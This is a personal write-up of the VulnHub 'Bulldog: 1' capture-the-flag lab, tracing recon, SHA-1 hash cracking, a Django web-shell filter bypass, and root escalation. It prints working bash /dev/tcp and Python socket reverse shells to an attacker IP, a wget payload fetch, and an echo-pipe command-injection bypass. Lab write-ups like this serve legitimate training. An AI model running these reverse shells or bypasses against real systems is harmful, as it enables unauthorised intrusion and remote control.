<div align="center">

# 🐶 VulnHub Bulldog: 1 Lab

<br/>

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue?style=for-the-badge&logo=linux&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%20%2F%20Intermediate-yellow?style=for-the-badge)
![Stack](https://img.shields.io/badge/Stack-Django%20%7C%20Python%202.7-informational?style=for-the-badge&logo=python&logoColor=white)
![Vector](https://img.shields.io/badge/Vector-Command%20Injection%20%2B%20SHA--1%20Crack-red?style=for-the-badge)
![Shell](https://img.shields.io/badge/Shell-nc%20Reverse%20Shell-orange?style=for-the-badge&logo=gnubash&logoColor=white)
![Status](https://img.shields.io/badge/Rooted-%E2%9C%94%20Congrats.txt%20Read-success?style=for-the-badge)

</div>

---

## 📖 About

This is my personal writeup for **[Bulldog: 1](https://www.vulnhub.com/entry/bulldog-1,211/)** on VulnHub: a Boot-to-Root challenge themed around a fictional company, Bulldog Industries, whose site was previously defaced by the "German Shepherd Hack Team."

The machine runs a **Django web application** (Python 2.7.12) that leaks SHA-1 password hashes in its HTML source. From there the path winds through hash cracking, authenticated WebShell access, command injection filter bypass via `echo` piping, an `nc` reverse shell, binary string analysis for a hidden password, and finally a `sudo su -` privilege escalation to root.

| Field | Details |
|---|---|
| 🖥️ Machine | Bulldog: 1 |
| 👤 Author | Nick Frichette (`@frichette_n`) |
| ⚡ Difficulty | Beginner / Intermediate |
| 📦 Format | VirtualBox OVA |
| 🐧 OS | Ubuntu Linux |
| 🌐 Web Server | Django / WSGIServer 0.1 / Python 2.7.12 |
| 🎯 Goal | Read `/root/congrats.txt` as root |
| 🔗 Machine Page | https://www.vulnhub.com/entry/bulldog-1,211/ |

---

## 🗺️ Attack Chain

```
[Host Discovery] → [Port Scan] → [dirb Directory Scan]
    → [/dev/ Source Leak] → [SHA-1 Hash Crack] → [Django Login]
        → [WebShell Access] → [Filter Bypass] → [nc Reverse Shell]
            → [Hidden Binary] → [strings Password] → [sudo su → ROOT 🏆]
```

---

## 🛠️ Methodology

### 1️⃣ Host Discovery

Three methods were used to locate the target on the local subnet.

```bash
# Method 1: ARP scan
arp-scan -l
# → 192.168.44.153

# Method 2: Nmap ping sweep
nmap -sP 192.168.44.0/24

# Method 3: Netdiscover
netdiscover -r 192.168.44.0/24 -i eth0
```

---

### 2️⃣ Port Scanning

```bash
nmap -sS -T4 -A -p- 192.168.44.153
```

| Port | Service | Notes |
|------|---------|-------|
| 23 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80 | HTTP | Django: `WSGIServer/0.1 Python/2.7.12` |
| 8080 | HTTP | Django: same stack |

> 💡 The HTTP header `WSGIServer/0.1 Python/2.7.12` fingerprints this as a **Django** web server.

Quick banner probing with `nc` confirmed service behaviour on each port:

```bash
nc -nv 192.168.44.153 23
nc -nv 192.168.44.153 80
nc -nv 192.168.44.153 8080
```

---

### 3️⃣ Directory Enumeration

```bash
dirb http://192.168.44.153
```

**Key directories discovered:**

| Path | Description |
|------|-------------|
| `/admin/` | Django administration login |
| `/dev/` | Developer notes page: **goldmine** |
| `/dev/shell/` | Restricted WebShell (auth required) |
| `/admin/login/` | Login endpoint |
| `/admin/auth/` | Auth management |

---

### 4️⃣ Source Code Analysis & Hash Discovery

Browsing `http://192.168.44.153/dev/` revealed a developer notice page explaining the site had been migrated to Django with SSH enabled. Crucially, **viewing page source exposed 7 employee email + SHA-1 hash pairs** left in an HTML comment:

```
alan@bulldogindustries.com: 6515229daf8dbdc8b89fed2e60f107433da5f2cb
william@bulldogindustries.com: 38882f3b81f8f2bc47d9f3119155b05f954892fb
malik@bulldogindustries.com: c6f7e34d5d08ba4a40dd5627508ccb55b425e279
kevin@bulldogindustries.com: 0e6ae9fe8af1cd4192865ac97ebf6bda414218a9
ashley@bulldogindustries.com: 553d917a396414ab99785694afd51df3a8a8a3e0
nick@bulldogindustries.com: ddf45997a7e18a25ad5f5cf222da64814dd060d5
sarah@bulldogindustries.com: d8b8dd5e7f000b8dea26ef8428caf38c04466b3e
```

---

### 5️⃣ SHA-1 Hash Cracking

#### Method A: Online Lookup

Submitted each hash to [cmd5.com](https://cmd5.com) and [somd5.com](https://www.somd5.com). Two cracked successfully:

| User | Hash | Plaintext |
|------|------|-----------|
| `nick@bulldogindustries.com` | `ddf459...` | **`bulldog`** |
| `sarah@bulldogindustries.com` | `d8b8dd...` | **`bulldoglover`** |

#### Method B: hash-identifier + John the Ripper

```bash
# Identify algorithm
hash-identifier
# → SHA-1

# Crack with John
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

### 6️⃣ Django Admin Login

Full email addresses as usernames failed. Shortname usernames succeeded:

```
Username: nick      Password: bulldog        → Logged in (limited perms)
Username: sarah     Password: bulldoglover   → Logged in (limited perms)
```

> Both accounts lacked edit permissions in Django admin, but authenticated access was enough to unlock `/dev/shell/`.

---

### 7️⃣ WebShell Access & Command Injection

Navigating to `http://192.168.44.153/dev/shell/` with an authenticated session revealed a restricted WebShell. Only 6 commands were whitelisted:

```
ifconfig   ls   echo   pwd   cat   rm
```

Direct execution of `whoami` or `bash` returned: `INVALID COMMAND. I CAUGHT YOU HACKER!`

#### Filter Bypass via `echo` + Pipe

The `echo` command was allowed: which was enough to wrap any payload and pipe it to bash:

```bash
# Confirm bypass works
echo whoami|sh
# → django

# Chain allowed commands with &&
ifconfig&&ls
ifconfig & whoami
```

---

### 8️⃣ Netcat Reverse Shell

**On Kali (attacker):**

```bash
nc -lvp 4444
```

**In the WebShell (target):**

```bash
# Direct bash reverse shell: blocked by filter
bash -i >& /dev/tcp/192.168.44.138/4444 0>&1

# Bypass: wrap in echo and pipe to bash
echo "bash -i >& /dev/tcp/192.168.44.138/4444 0>&1" | bash

# Or chain with a whitelisted command
ls &&echo "bash -i >& /dev/tcp/192.168.44.138/4444 0>&1" | bash
```

> ✅ Shell caught: running as `django` user.

#### Alternative: Python Socket Reverse Shell

```bash
# On Kali: serve the script
python -m SimpleHTTPServer 80

# In the WebShell: download and trigger
pwd&wget http://192.168.44.138/bulldog-webshell.py
```

```python
# bulldog-webshell.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.44.138", 4444))   # Kali IP / nc listener port
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

```bash
# Upgrade to interactive TTY
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

### 9️⃣ Post-Exploitation: Hidden Binary & Password Extraction

With a shell as `django`, exploring the home directory revealed an interesting user:

```bash
cd /home
ls
# → bulldogadmin   django

cd bulldogadmin
ls -al
# → .hiddenadmindirectory  (hidden!)

cd .hiddenadmindirectory
ls -al
# → customPermissionApp   note
```

`customPermissionApp` was a compiled ELF binary with no execute permission. Instead of running it, its strings were extracted:

```bash
strings customPermissionApp
```

The output contained four fragments, each padded with a trailing `H` (stack artifact: not part of the password):

```
SUPERultH
imatePASH
SWORDyouH
CANTget
```

> 🔑 Root password: **`SUPERultimatePASSWORDyouCANTget`**

---

### 🔟 Privilege Escalation → Root

```bash
# Upgrade shell to full TTY first (required for su)
python -c 'import pty; pty.spawn("/bin/bash")'

# Escalate to root
sudo su -
# [sudo] password for django: SUPERultimatePASSWORDyouCANTget

whoami
# → root

ls /root
# → congrats.txt

cat /root/congrats.txt
# → Congratulations on completing this VM! ...
```

---

## 🏆 Flag

<div align="center">

```
  ___ ___  _ __   __ _ _ __ __ _| |_ ___
 / __/ _ \| '_ \ / _` | '__/ _` | __/ __|
| (_| (_) | | | | (_| | | | (_| | |_\__ \
 \___\___/|_| |_|\__, |_|  \__,_|\__|___/
                 |___/

Congratulations on completing this VM! :D
That wasn't so bad was it?: Nick Frichette (@frichette_n)
```

</div>

---

## 📊 Attack Summary

| Phase | Technique | Outcome |
|---|---|---|
| 🔍 Recon | arp-scan / nmap / dirb | Target IP + open ports + key dirs |
| 📄 Source Analysis | Browser DevTools on `/dev/` | 7 SHA-1 hashes leaked |
| 🔓 Hash Cracking | Online lookup + John | `bulldog` / `bulldoglover` |
| 🖥️ Auth | Django admin login | WebShell unlocked |
| 💉 Injection | `echo` pipe bypass | Command filter evaded |
| 🐚 Shell | `nc -lvp 4444` + bash redirect | Reverse shell as `django` |
| 🔎 Enumeration | `ls -al` + `strings` | Hidden binary → root password |
| ⬆️ PrivEsc | `python pty` + `sudo su -` | Root shell |
| 🏆 Flag | `cat /root/congrats.txt` | **Rooted!** |

---

## 🧰 Tools Used

| Tool | Purpose |
|---|---|
| `arp-scan` / `netdiscover` | Host discovery |
| `nmap` | Port scanning & service fingerprinting |
| `nc` (netcat) | Port probing & reverse shell listener |
| `dirb` | Directory brute-force |
| `hash-identifier` | Identify hash algorithm (SHA-1) |
| `john` | Offline hash cracking |
| `cmd5.com` / `somd5.com` | Online SHA-1 lookup |
| `strings` | Extract readable strings from binary |
| `python pty` | Interactive TTY upgrade |

---

## 📚 References

- [VulnHub Machine Page](https://www.vulnhub.com/entry/bulldog-1,211/)
- [Machine Author: Nick Frichette](https://frichetten.com)

---

## ⚠️ Disclaimer

> This writeup is for **educational purposes only**. All testing was performed in an isolated lab environment against an intentionally vulnerable machine. Never use these techniques on systems you do not own or have explicit written authorization to test.

---

## 🏷️ Tags

`ctf` `vulnhub` `boot-to-root` `django` `command-injection` `webshell` `sha1-cracking` `netcat` `reverse-shell` `privilege-escalation` `strings` `python` `kali-linux` `beginner` `intermediate` `writeup` `linux`
